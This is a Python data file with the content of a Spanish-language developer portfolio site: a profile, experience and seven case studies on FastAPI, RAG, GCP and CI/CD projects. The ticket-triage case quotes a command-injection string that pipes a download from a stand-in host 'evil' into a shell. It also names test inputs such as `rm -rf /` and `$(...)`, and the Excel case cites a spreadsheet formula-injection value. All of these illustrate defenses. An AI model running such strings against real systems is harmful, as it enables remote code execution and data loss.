"""Contenido del sitio: perfil, experiencia y los siete casos de estudio.

Todo texto de los casos sale de lo que cada repositorio documenta y comprueba con tests. Los números (tests,
reglas, etc.) son los reales de cada repo; lo que NO se verificó se dice en 'limits'. Marcado ligero en los textos:
`código` y **negrita**.
"""

import os

# Formulario de contacto (Web3Forms). La access_key es PÚBLICA por diseño (va en el HTML) y está ligada al correo
# de destino en el panel del servicio, por eso el correo no aparece en el sitio. Vacía = el sitio muestra el
# botón de correo de siempre. Las variables de entorno solo se usan para probar con un servidor simulado.
FORM_ENDPOINT = os.environ.get("FORM_ENDPOINT", "https://api.web3forms.com/submit")
FORM_ACCESS_KEY = os.environ.get("FORM_ACCESS_KEY", "")

GITHUB_USER = "santiagovalenzuelalopez-gif"
SITE_URL = f"https://{GITHUB_USER}.github.io"
LINKEDIN = "https://www.linkedin.com/in/santiagovalenzuelal/"
EMAIL = "santiagovlopez20@hotmail.com"

PROFILE = {
    "name": "Santiago Valenzuela López",
    "title": "Ingeniero Mecatrónico · Backend e IA aplicada",
    "location": "Cali, Colombia",
    "tagline": "Diseño servicios en la nube que se pueden operar, auditar y explicar: IA generativa con RAG, "
               "plataformas sobre Cloud Run y gobernanza como código.",
    "about": [
        "Ingeniero mecatrónico con experiencia diseñando y ejecutando de forma autónoma un área de **gobernanza cloud (GCP)** "
        "aplicada a **63 servicios** en QA/preproducción, incluyendo soluciones de **IA generativa con arquitectura RAG** sobre Gemini "
        "para análisis documental y asistentes conversacionales.",
        "Vengo de los sistemas de control: pienso las arquitecturas como sistemas con entradas, estados y realimentación. "
        "Me importa que un servicio falle de forma predecible, que se pueda verificar y que otra persona pueda reproducirlo.",
    ],
    "differentiator": "Diseño de arquitecturas cloud de extremo a extremo (gobernanza, seguridad, CI/CD y despliegue de servicios), "
                      "ejecutado de forma autónoma y con documentación reproducible por terceros.",
    "disclaimer": "Los proyectos de este portafolio son **reimplementaciones desde cero, con datos sintéticos**, de patrones y "
                  "problemas reales que resolví trabajando en plataformas de microservicios. No contienen código, datos ni "
                  "infraestructura de ningún empleador o cliente. Se desarrollaron con **Claude Code** como asistente de programación.",
}

PILLARS = [
    ("IA aplicada", "RAG sobre Gemini con File Search, function calling con allow-list y agentes especialistas con presupuesto de tiempo."),
    ("Plataforma cloud", "Cloud Run, API Gateway, VPC, IAM y Secret Manager; CI/CD sin llaves con Workload Identity Federation."),
    ("Gobernanza como código", "Estándares que se ejecutan y se verifican, con excepciones justificadas y observabilidad generada."),
]

EXPERIENCE = {
    "role": "Profesional de Proyectos · Desarrollador",
    "scope": "Plataforma de microservicios y gobernanza cloud (GCP)",
    "period": "oct. 2025 – sep. 2026",
    "bullets": [
        "Único responsable del área de **gobernanza cloud**: ingresé sin estándares ni procesos formales y diseñé, construí y documenté la gobernanza que la organización utiliza.",
        "Diseñé la **arquitectura de referencia** de la plataforma (Load Balancer → API Gateway → Cloud Run, VPC) y **5 estándares formales**, aplicados a **63 servicios** Cloud Run en QA/preproducción, **94 %** de ellos con escalado a cero.",
        "Implementé soluciones de **IA generativa con RAG** sobre Gemini API y Gemini File Search Store: análisis y resumen de documentos jurídicos (en uso) y un chatbot institucional para clientes del sector público (en desarrollo).",
        "Diagnostiqué una **limitación de payload en API Gateway** y diseñé una capa de autenticación alterna (validación por audiencia y credencial de cuenta de servicio) para los servicios que la superan, adoptada como estándar del equipo.",
        "Construí un pipeline propio de sincronización Azure Repos ↔ GitHub, base del CI/CD de los despliegues a Cloud Run.",
        "Responsable directo de **21 repositorios**: 7 construidos desde cero y 4 heredados y mejorados sustancialmente.",
        "Automaticé la documentación y la verificación de cumplimiento del estándar con **2 skills de Claude Code**, adoptadas por otro desarrollador del equipo.",
    ],
}

STACK = [
    ("Backend", ["Python", "FastAPI", "SQLAlchemy", "pytest", "PHP (puntual)"]),
    ("Cloud (GCP)", ["Cloud Run", "API Gateway", "VPC", "IAM", "Secret Manager", "Firestore", "Eventarc", "Cloud Build"]),
    ("IA", ["Gemini API", "Gemini File Search (RAG)", "Function calling", "Agentes con Claude Code"]),
    ("Datos", ["MongoDB", "MySQL", "Firestore"]),
    ("DevOps", ["Docker", "Azure DevOps", "GitHub Actions", "Workload Identity Federation", "Bash"]),
]

EDUCATION = [
    ("Ingeniería Mecatrónica", "Universidad Autónoma de Occidente (UAO) · título en trámite"),
    ("Especialización en Inteligencia Artificial", "UAO · 1 de 2 semestres cursados"),
    ("Google Professional Cloud Architect", "en preparación"),
]

# ---------------------------------------------------------------------------------------------------------------
# Casos de estudio
# ---------------------------------------------------------------------------------------------------------------

BUILT = "Diseñé y construí"
EXTENDED = "Extendí y refactoricé"

PROJECTS = [
    {
        "slug": "multitenant-rag-chatbot",
        "title": "Chatbot RAG multitenant",
        "kicker": "IA aplicada · FastAPI · Gemini",
        "authorship": BUILT,
        "summary": "Un servicio, muchas organizaciones: cada tenant con su identidad, protocolo y base de conocimiento aislados. "
                   "Responde por el camino más barato y determinista posible.",
        "tags": ["FastAPI", "Gemini File Search", "RAG", "Firestore", "Function calling"],
        "metrics": [("19", "tests"), ("4", "niveles de resolución"), ("0", "credenciales para ejecutarlo")],
        "problem": "Un chatbot de atención atiende a varias organizaciones con el mismo código. Cada una necesita su tono, sus reglas, "
                   "sus respuestas fijas y su propia base de conocimiento, sin que una vea nada de otra. Y el LLM es lento y caro para "
                   "preguntas que un menú resuelve sin él.",
        "diagram": """flowchart TD
    A[POST /api/v1/chat] --> B{¿Tenant activo?}
    B -- no --> X[404 sin fallback]
    B -- sí --> C{¿Herramienta habilitada<br/>y mensaje con sus datos?}
    C -- sí --> D[LLM clasifica → handler → LLM redacta]
    C -- no --> E{¿Intención sin datos?}
    E -- sí --> F[Respuesta que pide los datos]
    E -- no --> G{¿Keyword o menú?}
    G -- sí --> H[Respuesta predeterminada, sin LLM]
    G -- no --> I[RAG sobre el conocimiento del tenant]""",
        "decisions": [
            ("Resolver de lo más barato a lo más caro",
             "Cada llamada al LLM cuesta latencia y dinero, y el RAG no es determinista.",
             "Orden fijo: herramienta → intención sin datos → respuesta predeterminada → RAG. Un mensaje que ya trae los datos de una herramienta salta el menú.",
             "Las preguntas de menú no gastan LLM, y un `consultar ticket TCK-1` no devuelve siempre el mismo instructivo."),
            ("Herramientas con allow-list y fail-closed",
             "Un modelo que elige qué ejecutar es una superficie de ataque.",
             "La herramienta solo existe si el tenant la habilita; se detecta por la **forma** del mensaje, no por palabras; los argumentos los valida el handler, no el modelo.",
             "Un tenant sin la capacidad no puede activarla ni con un mensaje bien formado. Un código incorrecto y un ticket inexistente dan la misma respuesta (no se enumeran tickets)."),
            ("Function calling en dos turnos",
             "File Search y function calling **no se pueden combinar** en una misma request de Gemini.",
             "Turno 0 de clasificación sin RAG; si pide una herramienta, se ejecuta una de la allow-list y un turno final redacta con el resultado inyectado.",
             "Todo el camino tiene un presupuesto de tiempo por debajo del deadline del gateway: ante un timeout responde con un mensaje propio, no con un 504 opaco."),
            ("El fast path no intercepta preguntas elaboradas",
             "Una pregunta larga que menciona de pasada «horario» quedaba atrapada por el menú.",
             "Las keywords se comparan por palabra completa, la más larga gana y se descarta el atajo si el mensaje trae más de 5 palabras extra.",
             "Los atajos sirven a quien navega por menú; quien pregunta con detalle llega al RAG."),
        ],
        "verified": [
            "19 tests: aislamiento entre tenants, fast path, RAG, herramienta (incluido el caso multi-turno), *fail-closed* y rechazo de *path traversal*.",
            "Servidor real levantado y probado de punta a punta; CI en verde (lint, tests y build de Docker).",
            "Backends intercambiables: archivos + LLM simulado (sin credenciales) o Firestore + Gemini (producción).",
        ],
        "limits": [
            "La ruta con Gemini real no se ejercita en el CI (requiere clave): el LLM simulado no es un modelo, existe para probar el pipeline.",
        ],
        "repo": "multitenant-rag-chatbot",
    },
    {
        "slug": "rag-ingest-eventarc",
        "title": "Ingesta event-driven de conocimiento",
        "kicker": "Eventos · Idempotencia · Gemini File Search",
        "authorship": BUILT,
        "summary": "Cuando alguien sube, reemplaza o borra un archivo en un bucket, el File Search Store de su tenant se actualiza solo, "
                   "aunque los eventos lleguen duplicados o desordenados.",
        "tags": ["Eventarc", "Cloud Run", "Idempotencia", "Puertos y adaptadores", "FastAPI"],
        "metrics": [("27", "tests"), ("3", "puertos, 2 backends"), ("204/500", "contrato con el emisor")],
        "problem": "Eventarc entrega eventos **al menos una vez**: pueden duplicarse, llegar fuera de orden y se reintentan ante un 5xx. "
                   "Sobrescribir un archivo emite `finalized` (nuevo) **y** `deleted` (viejo), y el `deleted` puede llegar tarde "
                   "y borrar lo recién subido.",
        "diagram": """flowchart LR
    U[Editor de contenido] -->|sube / borra| B[(Bucket GCS)]
    B -->|finalized / deleted| E[Eventarc]
    E -->|CloudEvent| S[Servicio en Cloud Run]
    S --> F[(Firestore<br/>tenants + tracking)]
    S --> G[Gemini File Search Store]
    C[Chatbot RAG] --> G""",
        "decisions": [
            ("La generación del objeto como reloj lógico",
             "Sin orden garantizado, un evento viejo puede deshacer uno nuevo.",
             "Cada documento se registra con la `generation` de GCS. Un evento con generación igual o menor se omite; un `deleted` más viejo que lo registrado no borra la versión nueva.",
             "Duplicados, desórdenes y reentregas son inofensivos. Se probó con la secuencia gen 1, gen 2, gen 1 y `deleted` gen 1: queda un único documento en gen 2."),
            ("El código de respuesta es la política de reintentos",
             "Un 5xx por algo irrecuperable llena la cola de basura; un 2xx por algo recuperable pierde el dato.",
             "**204** si se procesó o no tiene sentido reintentar (tenant desconocido, ruta inválida, bucket ajeno); **500** solo ante fallos transitorios.",
             "Un import fallido no deja nada registrado y el reintento parte de un estado limpio, sin duplicados."),
            ("Reemplazar = borrar y luego importar, con limpieza de huérfanos",
             "El import de Gemini es una operación larga que puede fallar a medias y dejar un documento sin registrar.",
             "Se borra la versión previa, se importa la nueva y, si el import falla o se atasca, el adaptador descarta el documento huérfano antes de propagar el error.",
             "El siguiente reintento no importa una segunda copia al RAG."),
            ("Puertos y adaptadores",
             "Probar la lógica de sincronización con mocks de SDK es frágil.",
             "La lógica depende de tres puertos (tenants, tracking, conocimiento) con adaptadores en memoria, Firestore y Gemini.",
             "El orden de eventos y los reintentos se prueban sin red, y el modo demo corre sin credenciales."),
        ],
        "verified": [
            "27 tests: orden de eventos, idempotencia, reintentos, aislamiento por tenant, rutas hostiles (`../`) y el contrato HTTP con Eventarc.",
            "Escenario real con `curl`/script: duplicado, reemplazo, evento viejo, `deleted` tardío y tenant inexistente.",
            "CI en verde.",
        ],
        "limits": [
            "Los adaptadores de Gemini y Firestore no se ejercitan en el CI (requieren credenciales).",
        ],
        "repo": "rag-ingest-eventarc",
    },
    {
        "slug": "file-service-fastapi",
        "title": "Descargas seguras con auditoría por cliente",
        "kicker": "Seguridad · Concurrencia · SQLAlchemy async",
        "authorship": BUILT,
        "summary": "Un backend de confianza emite enlaces de un solo uso; el servicio entrega el archivo por streaming y deja una "
                   "auditoría completa en la base de datos del cliente dueño.",
        "tags": ["FastAPI", "SQLAlchemy async", "Streaming", "Seguridad", "Multi-BD"],
        "metrics": [("41", "tests"), ("1", "descarga por enlace"), ("3", "defectos clásicos cubiertos")],
        "problem": "Entregar archivos privados a través de un enlace obliga a resolver a la vez seguridad (que no se comparta ni se "
                   "reutilice), concurrencia (dos clics simultáneos), robustez (el cliente cierra a mitad) y aislamiento "
                   "(cada cliente tiene su propia base de datos).",
        "diagram": """sequenceDiagram
    participant B as Backend de confianza
    participant S as File Service
    participant D as BD del cliente
    participant U as Usuario final
    B->>S: POST emitir enlace (Bearer)
    S->>D: INSERT auditoría (PENDING, token, expira)
    S-->>B: URL con token
    B-->>U: entrega el enlace
    U->>S: GET /download/{id}?token
    S->>D: valida token, expiración, IP, anti-spam
    S->>D: reclama PENDING → REDIRECTED (atómico)
    S-->>U: stream por bloques
    S->>D: cierra COMPLETED o FAILED + contador""",
        "decisions": [
            ("Reclamación atómica en vez de «leer, comprobar, escribir»",
             "Comprobar el estado y marcarlo en dos pasos deja una ventana: dos peticiones simultáneas pasan ambas.",
             "La transición `PENDING|FAILED → REDIRECTED` es un único `UPDATE ... WHERE status IN (...)`; solo quien obtiene `rowcount == 1` descarga.",
             "Correcto sin bloqueos largos. Un `REDIRECTED` abandonado por un proceso caído se puede retomar tras un tiempo."),
            ("El éxito se mide en bytes, no en ausencia de excepciones",
             "Si el cliente cierra la conexión, no hay una excepción de negocio: el generador simplemente se cancela.",
             "El cierre vive en un `finally` y exige `bytes enviados == tamaño`; si no, `FAILED` (499) y el enlace sigue válido para reintentar.",
             "Contar el bloque *después* del `yield` evita marcar `COMPLETED` una descarga cuyo último bloque nunca llegó."),
            ("Tres defectos clásicos, cubiertos con tests",
             "`startswith` para validar rutas deja pasar `/data/media2/x` bajo `/data/media`; `X-Forwarded-For` es falsificable; comparar tokens con `==` filtra por tiempo.",
             "`Path.resolve()` + `is_relative_to` (con un test del directorio hermano y de symlinks); IP tomada del proxy de confianza, no del primer valor; `hmac.compare_digest`.",
             "«No existe» y «token incorrecto» devuelven exactamente la misma respuesta: no se pueden enumerar enlaces."),
            ("Una base de datos por cliente",
             "El aislamiento por columna `client_id` depende de que nadie olvide un `WHERE`.",
             "Engines creados bajo demanda y cacheados, con un lock para no crear dos pools del mismo cliente en frío.",
             "Un enlace emitido en un cliente es 404 en otro, y no se revela si el cliente existe."),
        ],
        "verified": [
            "41 tests (40 pasan y 1 se omite en Windows por permisos de symlink; en Linux corre): flujo completo, un solo uso, expiración, IP, aislamiento entre clientes, traversal, reclamación atómica, cortes de stream y reintento.",
            "Servidor real con `curl`: respuesta *chunked* con el archivo idéntico, reuso del enlace → 403, traversal → 403. CI en verde.",
            "Sin `Content-Length` a propósito: con HTTP/1 una respuesta de longitud fija está limitada a 32 MiB en Cloud Run; en streaming no.",
        ],
        "limits": [
            "El modo con MySQL como BD maestra no se ejercita en los tests (sí la construcción de la URL y el escape de credenciales).",
            "Sin soporte de `Range`: un corte obliga a empezar de nuevo.",
        ],
        "repo": "file-service-fastapi",
    },
    {
        "slug": "excel-reports-service",
        "title": "Reportes Excel con memoria acotada",
        "kicker": "Rendimiento · Seguridad de datos · SQLAlchemy",
        "authorship": BUILT,
        "summary": "Exporta reportes a Excel desde la base de datos de cada cliente sin que una tabla grande tumbe el servicio ni los "
                   "datos de un usuario se conviertan en un vector de ataque.",
        "tags": ["FastAPI", "openpyxl", "Streaming", "Inyección de fórmulas", "SQLAlchemy"],
        "metrics": [("28", "tests"), ("~3 MB", "pico con 30.000 filas"), ("413", "tope de filas")],
        "problem": "La implementación obvia (`pandas.read_sql` y luego `to_excel`) materializa la tabla completa varias veces en memoria. "
                   "Además, los datos del reporte los escriben usuarios: un nombre como `=HYPERLINK(...)` se ejecuta al abrir el archivo.",
        "diagram": """flowchart LR
    C[Cliente HTTP] -->|GET /reports/users<br/>Bearer| A[FastAPI]
    A --> R{{ClientResolver}}
    R -->|credenciales| M[(BD maestra)]
    A -->|engine desechable| D[(BD del cliente)]
    D -->|filas por bloques| W[openpyxl write_only]
    W -->|spool a disco| F[(.xlsx temporal)]
    F -->|stream| C""",
        "decisions": [
            ("Streaming de punta a punta, sin DataFrame",
             "La memoria crece por un factor del tamaño de la tabla y una exportación grande puede tumbar la instancia.",
             "Lectura por bloques (`stream_results` + `partitions`), escritura fila a fila con `write_only` y un archivo temporal que se vuelca a disco.",
             "La memoria depende del bloque, no de la tabla. Un test lo mide con `tracemalloc`: triplicar la tabla no triplica el pico."),
            ("Inyección de fórmulas sin alterar el dato",
             "`openpyxl` trata como fórmula cualquier texto que empiece con `=`.",
             "Esos valores se escriben con tipo *texto*: se ven tal cual y nunca se evalúan. No se antepone un apóstrofo, que quedaría visible en la celda.",
             "Teléfonos como `+57...` quedan intactos. Un test lee el tipo de dato de la celda."),
            ("Tope de filas con `LIMIT max + 1`",
             "Excel admite 1.048.576 filas por hoja y un reporte enorme es mala idea para un servicio HTTP síncrono.",
             "Se pide una fila de más: si llega, hay más datos que el tope y responde **413** sin haber recorrido toda la tabla.",
             "El servicio se protege solo y pide acotar el filtro."),
            ("Reportes declarativos y engines desechables",
             "Los identificadores SQL no deben salir de la petición; un pool por cliente agotaría las conexiones de decenas de bases.",
             "Cada reporte es una definición (tabla, columnas permitidas, filtro) armada con `table()/column()`; se abre una conexión por exportación (`NullPool`).",
             "Agregar un reporte es agregar una definición. Un cliente inexistente y un `client_id` malformado devuelven la misma respuesta."),
        ],
        "verified": [
            "28 tests: ambos reportes, filtro de letra (comodines e inyección SQL rechazados), fórmulas, caracteres de control, zona horaria y límites inclusivos del rango, 413, aislamiento entre clientes, autenticación y esquema inesperado.",
            "Servidor real: 396 usuarios filtrados por letra y 1.333 eventos de auditoría con fechas nativas de Excel. CI en verde.",
            "Una exportación abortada ya no deja generadores de `openpyxl` sin cerrar (el warning es un error en los tests).",
        ],
        "limits": [
            "El modo con MySQL maestra y la verificación de ID tokens de Google no se prueban con infraestructura real.",
            "Respuesta síncrona: para reportes de minutos conviene encolar y entregar por enlace.",
        ],
        "repo": "excel-reports-service",
    },
    {
        "slug": "ai-ticket-triage-agents",
        "title": "Triaje de tickets con agentes de IA",
        "kicker": "Agentes · Orquestación · Seguridad",
        "authorship": EXTENDED,
        "summary": "Un orquestador clasifica el ticket con apoyo de FAQ, convoca a especialistas (visual y de logs) y publica un único "
                   "diagnóstico con la evidencia. Un código, tres desplegables.",
        "tags": ["FastAPI", "Gemini", "Agentes", "Orquestación", "Seguridad"],
        "metrics": [("76", "tests"), ("3", "roles de despliegue"), ("11", "entradas hostiles probadas")],
        "problem": "El texto de un ticket lo escribe un tercero y de él sale la «entidad» que se busca en un servidor de logs. "
                   "Además, los webhooks se reintentan y duplican, y un especialista lento no debe impedir el diagnóstico.",
        "diagram": """flowchart LR
    H[Helpdesk] -->|webhook + secreto| O[Orquestador]
    O -->|1 · guardas + clasificar + FAQ| L[(LLM)]
    O -->|2a · si es visual| V[Agente visual]
    O -->|2b · incidente o crítico| G[Agente de logs]
    G -->|búsqueda segura| S[(Logs del servidor)]
    O -->|3 · diagnóstico + evidencia| H""",
        "decisions": [
            ("El texto del ticket es entrada no confiable",
             "Una entidad como `x\"; curl evil | sh; \"` interpolada en un comando remoto sería ejecución remota de comandos.",
             "Se reduce a un token estricto (`[a-z0-9-]`), se entrecomilla con `shlex.quote` y, si no cumple, **no se busca**; SSH solo con hosts conocidos. El modelo no ejecuta nada: su salida solo se publica o se valida contra listas cerradas.",
             "Tests con `\"; rm -rf /`, `$(...)`, backticks, `*` y `../`: nada llega al servidor."),
            ("Idempotencia con dos mecanismos para dos riesgos",
             "Los helpdesk reenvían webhooks, a veces en paralelo.",
             "La nota propia es la marca de idempotencia (sobrevive a reinicios e instancias) y un conjunto de tickets en curso evita procesar dos veces a la vez.",
             "Dos eventos simultáneos procesan el ticket **una** vez. Límite documentado: el bloqueo en curso es por proceso."),
            ("Especialistas en paralelo con presupuesto",
             "Un especialista caído o lento no debe bloquear el diagnóstico.",
             "Se lanzan juntos con `gather`, cada uno con su límite; si fallan o tardan, el diagnóstico sale igual y lo indica («omitido por latencia»).",
             "La latencia es la del más lento, no la suma: el test mide 2 × 0,3 s en menos de 0,55 s."),
            ("Un código, tres desplegables",
             "El agente de logs necesita acceso a servidores; el orquestador está expuesto al helpdesk.",
             "`SERVICE_ROLE` monta lo que corresponde; el orquestador usa el mismo contrato en proceso o por HTTP con identidad de servicio.",
             "Solo el agente de logs tiene la cuenta con acceso a los servidores. El cliente HTTP se prueba contra el servidor real."),
        ],
        "verified": [
            "76 tests: flujo por tipo de ticket, guardas, idempotencia, paralelismo medido, degradación ante timeout y fallo, *kill switch* del tipo, entidades hostiles y el comando remoto construido.",
            "Despliegue separado probado de verdad: agente de logs protegido con token (401 sin él) y orquestador que lo llama por HTTP; la evidencia de logs llega literal al ticket. CI en verde.",
        ],
        "limits": [
            "Gemini y SSH reales no se ejercitan en los tests; sí la construcción segura del comando y el contrato del cliente HTTP.",
            "Solo hay adaptador de helpdesk en memoria: uno real implica implementar un puerto de tres métodos.",
        ],
        "repo": "ai-ticket-triage-agents",
    },
    {
        "slug": "cloudrun-wif-cicd-kit",
        "title": "CI/CD sin llaves hacia Cloud Run",
        "kicker": "DevOps · Seguridad · Workload Identity Federation",
        "authorship": BUILT,
        "summary": "Despliegue de Azure DevOps a Cloud Run sin llaves de service account ni repositorios espejo, con un script que "
                   "configura la federación y **verifica** que no quedó nada de más.",
        "tags": ["Azure DevOps", "Cloud Build", "WIF", "Bash", "IAM"],
        "metrics": [("56", "tests del script"), ("28", "comprobaciones de plantillas"), ("3", "cuentas con trabajos separados")],
        "problem": "Un pipeline que despliega con una llave JSON guarda una credencial de larga vida donde cualquiera puede copiarla. "
                   "Y la alternativa habitual (un espejo en GitHub con un trigger) añade un repo duplicado y otro token.",
        "diagram": """flowchart LR
    P[Pipeline de ADO] -->|GcpWifAuth<br/>token OIDC| S[GCP STS]
    S -->|solo el subject exacto| F[SA federada<br/><b>solo somete builds</b>]
    F -->|gcloud builds submit<br/>tarball del fuente| B[Cloud Build]
    B -->|corre como| D[SA del build]
    D -->|docker build + push| R[(Artifact Registry)]
    D -->|gcloud run deploy| C[Cloud Run]""",
        "decisions": [
            ("Tres cuentas con trabajos separados",
             "Si la identidad federada se compromete, no debe poder administrar Cloud Run ni el IAM.",
             "La federada **solo somete builds**; otra cuenta ejecuta el build y el deploy; la de runtime ejecuta el servicio. Solo la federada puede actuar como la del build.",
             "El daño de un pipeline comprometido queda acotado a someter un build."),
            ("Binding por subject exacto, nunca por prefijo ni pool",
             "Un binding amplio deja que cualquier conexión nueva herede el acceso.",
             "Doble control: condición del provider con la lista exacta de subjects **y** un `principal://` por subject.",
             "`verify` rechaza cualquier `principalSet`. Una conexión nueva exige un cambio explícito y revisable."),
            ("`verify` como fase de primera clase",
             "Un binding comodín apareció sin que nadie lo pidiera tras un cambio de IAM.",
             "`apply` termina siempre con `verify` (solo lectura, repetible): falla ante un comodín, un rol de más, una llave activa o un bucket público.",
             "Se pueden detectar derivas de configuración en cualquier momento, no cuando falla un despliegue."),
            ("Las lecciones de los errores, convertidas en reglas",
             "Varios fallos tenían un mensaje engañoso (un 403 que hablaba de `serviceusage` y era un listado de buckets).",
             "Las plantillas se validan: `GcpWifAuth` nunca con `continueOnError`, `builds submit` con `--gcs-source-staging-dir` y `COMMIT_SHA`, ningún PR dispara un despliegue.",
             "Editar una plantilla y reintroducir un error documentado hace fallar el CI."),
        ],
        "verified": [
            "56 pruebas del script contra un `gcloud` simulado: parten de una configuración conforme y la estropean de una en una; también verifican que `plan`, `preflight` y `verify` no modifican nada y que toleran la salida CRLF de Windows.",
            "28 comprobaciones de las plantillas y del `cloudbuild.yaml`; `shellcheck` limpio; CI en verde.",
            "El patrón se aplicó antes en un entorno real de preproducción (build exitoso, revisión con el 100 % del tráfico, `/health` correcto).",
        ],
        "limits": [
            "Esta versión parametrizada no se ha ejecutado contra un proyecto real, solo contra el `gcloud` simulado.",
            "La variante de producción con aprobación está marcada como no validada de punta a punta.",
        ],
        "repo": "cloudrun-wif-cicd-kit",
    },
    {
        "slug": "gcp-governance-toolkit",
        "title": "Gobernanza como código para Cloud Run",
        "kicker": "Gobernanza · Observabilidad · Herramientas de desarrollo",
        "authorship": BUILT,
        "summary": "Un estándar de servicio **ejecutable** (35 reglas con excepciones justificadas) y la observabilidad generada como "
                   "código: alertas, dashboards, métricas de logs y presupuesto.",
        "tags": ["Python", "AST", "CLI", "Cloud Monitoring", "Skills de Claude"],
        "metrics": [("102", "tests"), ("35", "reglas con ID y severidad"), ("38", "violaciones probadas una a una")],
        "problem": "Un estándar que vive en un documento se incumple sin que nadie se entere. Y las alertas copiadas de la consola "
                   "acaban siendo ruido: colapsadas en una sola serie, sin ventana y sin decir qué hacer.",
        "diagram": """flowchart LR
    R[Repositorio del servicio] -->|govkit check| C{Reglas S·A·C·E·D·M·P}
    W[.govkit.yml<br/>excepciones con motivo] --> C
    C -->|texto · JSON · Markdown| O[Reporte + código de salida]
    O --> CI[CI / skill de Claude]
    P[Proyecto GCP] -->|govkit observability| G[Alertas · Dashboards<br/>Métricas · Presupuesto]""",
        "decisions": [
            ("Análisis con el AST, no con expresiones regulares",
             "Con regex, un comentario que diga `# severity` cuenta como cumplimiento.",
             "El código se analiza con el árbol sintáctico; y el Dockerfile se interpreta como lo hace Docker (un `CMD [ ... ]` que no es JSON es forma shell; la forma exec no expande `$PORT`).",
             "El verificador falla cuando debe: cada regla se prueba estropeando un repo conforme de una en una."),
            ("Excepciones justificadas, no silenciadas",
             "Algunos servicios incumplen una regla a propósito (un webhook interno no se versiona).",
             "Se declaran en `.govkit.yml` **con un motivo** y aparecen en el reporte. Una excepción sin motivo no se aplica y es un fallo crítico.",
             "Nadie puede «hacer pasar» el reporte sin explicarlo."),
            ("El reporte nunca imprime un secreto",
             "El reporte acaba en logs de CI.",
             "Las credenciales se detectan por el nombre de la variable y por la forma del valor, pero solo se imprime el nombre. Un test lo comprueba en los tres formatos.",
             "Detectar una credencial no puede ser una forma de filtrarla."),
            ("Alertas que se pueden accionar",
             "Sin agrupar, `crossSeriesReducer` colapsa decenas de servicios en una serie; con `duration: 0` cada log ERROR abría un incidente.",
             "Una política por métrica agrupada por servicio, ventanas sostenidas y documentación de diagnóstico; umbral de VPC calculado sobre el máximo real; presupuesto sobre gasto real.",
             "Cada lección es un test, y `apply` es idempotente y tiene `--dry-run`."),
        ],
        "verified": [
            "102 tests: 38 violaciones del estándar detectadas una a una, falsos positivos conocidos, invariantes de las alertas y dashboards, y el aplicador con un ejecutor de `gcloud` falso.",
            "Se ejecutó sobre los cinco servicios FastAPI de este portafolio: sin hallazgos críticos; los medios que quedan son reales y no se retocaron. El propio verificador mostró dos huecos en sus reglas, ya corregidos y convertidos en tests.",
            "CI en verde.",
        ],
        "limits": [
            "Es análisis estático del repositorio: no consulta la nube (no conoce el `ingress` real de un servicio desplegado).",
            "La parte de observabilidad no se ha ejecutado contra un proyecto real en esta forma genérica.",
        ],
        "repo": "gcp-governance-toolkit",
    },
]
